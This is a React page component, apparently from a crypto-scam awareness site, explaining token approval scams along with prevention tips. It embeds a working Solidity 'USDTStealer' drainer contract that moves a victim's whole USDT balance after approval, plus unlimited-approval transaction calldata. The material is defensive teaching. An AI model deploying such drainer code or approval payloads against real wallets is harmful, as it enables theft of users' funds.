import React, { useState } from 'react'
import { Code, FileWarning, Cpu, Shield, Lock, AlertTriangle } from 'lucide-react'
import Web3Service from '../utils/web3'

export default function ApprovalScam() {
  const [showCode, setShowCode] = useState(false)
  const [walletConnected, setWalletConnected] = useState(false)
  const [walletAddress, setWalletAddress] = useState('')

  const connectWallet = async () => {
    const result = await Web3Service.connectWallet()
    if (result.success) {
      setWalletConnected(true)
      setWalletAddress(result.address)
    }
  }

  const demoContractCode = `// Malicious Smart Contract Example
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract USDTStealer {
    IERC20 public usdt;
    address public owner;
    
    constructor(address _usdtAddress) {
        usdt = IERC20(_usdtAddress);
        owner = msg.sender;
    }
    
    // Function called after victim gives approval
    function stealFunds(address victim) public {
        // Get victim's USDT balance
        uint256 balance = usdt.balanceOf(victim);
        
        // Transfer all USDT to scammer (works because of approval)
        require(
            usdt.transferFrom(victim, owner, balance),
            "Transfer failed"
        );
    }
    
    // Fallback function to receive ETH
    receive() external payable {}
}`

  const approvalTransaction = `// Approval Transaction Data (Hex)
0x095ea7b3
000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

// Decoded:
Function: approve(address spender, uint256 amount)
Spender: 0xDeadBeef... (scammer's contract)
Amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935
          ^ This is MAX_UINT256 = Unlimited Approval!`

  const scamProcess = [
    {
      step: 1,
      title: 'User Approves Unlimited USDT',
      description: 'Signs transaction giving scammer contract unlimited access',
      technical: 'Calls USDT.approve(scammerAddress, type(uint256).max)'
    },
    {
      step: 2,
      title: 'Scamer Gets Permission',
      description: 'Scammer contract can now transfer victim\'s USDT',
      technical: 'USDT.allowance(victim, scammerAddress) returns huge number'
    },
    {
      step: 3,
      title: 'Automatic Fund Drain',
      description: 'Scammer calls transferFrom() immediately',
      technical: 'USDT.transferFrom(victim, scammerAddress, balance)'
    },
    {
      step: 4,
      title: 'Funds Lost Forever',
      description: 'Transaction irreversible on blockchain',
      technical: 'Blockchain confirms transfer in ~3 seconds'
    }
  ]

  const preventionSteps = [
    {
      title: 'Check Transaction Details',
      description: 'Always decode and read transaction data before signing',
      icon: <FileWarning className="w-6 h-6" />
    },
    {
      title: 'Never Give Unlimited Approval',
      description: 'Only approve specific amounts needed for the transaction',
      icon: <Lock className="w-6 h-6" />
    },
    {
      title: 'Use Revoke.cash Regularly',
      description: 'Check and revoke unused token approvals',
      icon: <Shield className="w-6 h-6" />
    },
    {
      title: 'Use Multiple Wallets',
      description: 'Keep large amounts in cold/hardware wallets',
      icon: <Cpu className="w-6 h-6" />
    }
  ]

  return (
    <div className="container mx-auto px-4 py-8">
      <div className="text-center mb-12">
        <div className="inline-flex items-center justify-center p-4 bg-gradient-to-r from-red-500 to-orange-500 rounded-full mb-6">
          <AlertTriangle size={48} className="text-white" />
        </div>
        <h1 className="text-4xl font-bold text-gray-900 mb-4">
          Token <span className="text-transparent bg-clip-text bg-gradient-to-r from-red-600 to-orange-600">Approval Scams</span>
        </h1>
        <p className="text-xl text-gray-600 max-w-3xl mx-auto">
          Technical deep dive into how scammers steal funds using smart contract approvals
        </p>
      </div>

      {/* Wallet Connection Demo */}
      <div className="card mb-8">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">Live Demo: Check Your Approvals</h2>
            <p className="text-gray-600">Connect wallet to see how approvals work (Demo Mode)</p>
          </div>
          
          {!walletConnected ? (
            <button onClick={connectWallet} className="btn-primary">
              Connect Wallet (Demo)
            </button>
          ) : (
            <div className="text-right">
              <p className="text-sm text-gray-500">Connected</p>
              <p className="font-mono text-gray-900 truncate max-w-xs">
                {walletAddress}
              </p>
            </div>
          )}
        </div>

        {walletConnected && (
          <div className="bg-gradient-to-r from-red-50 to-orange-50 p-6 rounded-xl border border-red-200">
            <h3 className="font-bold text-red-800 mb-4 flex items-center space-x-2">
              <AlertTriangle className="w-6 h-6" />
              <span>⚠️ If This Was Real:</span>
            </h3>
            
            <div className="grid md:grid-cols-3 gap-4">
              <div className="p-4 bg-white rounded-lg">
                <p className="text-sm text-gray-600">Current Approvals</p>
                <p className="text-2xl font-bold text-red-600">0</p>
              </div>
              <div className="p-4 bg-white rounded-lg">
                <p className="text-sm text-gray-600">Risk Level</p>
                <p className="text-2xl font-bold text-green-600">LOW</p>
              </div>
              <div className="p-4 bg-white rounded-lg">
                <p className="text-sm text-gray-600">Protected Amount</p>
                <p className="text-2xl font-bold text-blue-600">$0</p>
              </div>
            </div>
            
            <p className="text-red-700 mt-4">
              In a real scam, unlimited approvals would appear here allowing scammers to drain funds.
            </p>
          </div>
        )}
      </div>

      {/* Technical Explanation */}
      <div className="grid lg:grid-cols-2 gap-8 mb-12">
        {/* How It Works */}
        <div className="card">
          <h3 className="text-2xl font-bold text-gray-900 mb-6 flex items-center space-x-2">
            <Cpu className="w-8 h-8 text-blue-600" />
            <span>How Approval Scams Work</span>
          </h3>
          
          <div className="space-y-6">
            {scamProcess.map((item) => (
              <div key={item.step} className="p-4 bg-gray-50 rounded-lg">
                <div className="flex items-start space-x-4">
                  <div className="w-8 h-8 bg-gradient-to-r from-red-600 to-orange-600 rounded-full flex items-center justify-center flex-shrink-0">
                    <span className="text-white font-bold">{item.step}</span>
                  </div>
                  <div className="flex-1">
                    <h4 className="font-bold text-gray-900 mb-1">{item.title}</h4>
                    <p className="text-gray-600 mb-2">{item.description}</p>
                    <code className="text-sm bg-gray-900 text-gray-100 p-2 rounded block">
                      {item.technical}
                    </code>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Prevention */}
        <div className="card">
          <h3 className="text-2xl font-bold text-gray-900 mb-6 flex items-center space-x-2">
            <Shield className="w-8 h-8 text-green-600" />
            <span>How to Protect Yourself</span>
          </h3>
          
          <div className="space-y-6">
            {preventionSteps.map((item, index) => (
              <div key={index} className="p-4 bg-green-50 rounded-lg">
                <div className="flex items-start space-x-4">
                  <div className="text-green-600 flex-shrink-0">
                    {item.icon}
                  </div>
                  <div>
                    <h4 className="font-bold text-gray-900 mb-1">{item.title}</h4>
                    <p className="text-gray-600">{item.description}</p>
                  </div>
                </div>
              </div>
            ))}

            <div className="p-4 bg-blue-50 rounded-lg">
              <h4 className="font-bold text-gray-900 mb-2">Essential Tools:</h4>
              <div className="space-y-2">
                <a href="https://revoke.cash" target="_blank" rel="noopener noreferrer" 
                   className="block p-3 bg-white rounded-lg hover:shadow transition">
                  <span className="font-semibold text-blue-600">🔗 Revoke.cash</span>
                  <p className="text-sm text-gray-600">Check and revoke token approvals</p>
                </a>
                <a href="https://bscscan.com" target="_blank" rel="noopener noreferrer"
                   className="block p-3 bg-white rounded-lg hover:shadow transition">
                  <span className="font-semibold text-blue-600">🔍 BSCScan</span>
                  <p className="text-sm text-gray-600">Verify transactions and contracts</p>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Code Examples */}
      <div className="card">
        <div className="flex items-center justify-between mb-6">
          <h3 className="text-2xl font-bold text-gray-900 flex items-center space-x-2">
            <Code className="w-8 h-8 text-purple-600" />
            <span>Technical Code Examples</span>
          </h3>
          <button
            onClick={() => setShowCode(!showCode)}
            className="btn-secondary"
          >
            {showCode ? 'Hide Code' : 'Show Code'}
          </button>
        </div>

        {showCode && (
          <div className="space-y-6">
            <div>
              <h4 className="font-bold text-gray-900 mb-2">Scammer's Smart Contract:</h4>
              <pre className="code-block bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto text-sm">
                {demoContractCode}
              </pre>
            </div>

            <div>
              <h4 className="font-bold text-gray-900 mb-2">Malicious Approval Transaction:</h4>
              <pre className="code-block bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto text-sm">
                {approvalTransaction}
              </pre>
            </div>

            <div className="bg-gradient-to-r from-red-50 to-orange-50 p-4 rounded-lg border border-red-200">
              <h4 className="font-bold text-red-800 mb-2">🚨 Critical Warning:</h4>
              <p className="text-red-700">
                This exact code pattern is used in real scams. Never sign transactions with 
                "ffffffffffffffff..." in the amount field - this means UNLIMITED approval.
              </p>
            </div>
          </div>
        )}

        <div className="mt-8 pt-8 border-t border-gray-200">
          <h4 className="font-bold text-gray-900 mb-4">Real-World Example:</h4>
          <div className="bg-gray-50 p-4 rounded-lg">
            <p className="text-gray-700 mb-2">
              <strong>Victim:</strong> Lost $50,000 USDT in 30 seconds
            </p>
            <p className="text-gray-700 mb-2">
              <strong>Method:</strong> QR code → Fake website → Unlimited USDT approval
            </p>
            <p className="text-gray-700">
              <strong>Result:</strong> Scammer transferred all funds immediately after approval
            </p>
          </div>
        </div>
      </div>

      {/* Navigation */}
      <div className="flex justify-between mt-8">
        <a href="/fake-website" className="btn-secondary">
          ← Fake Website Demo
        </a>
        <a href="/prevention" className="btn-primary">
          Prevention Guide →
        </a>
      </div>
    </div>
  )
}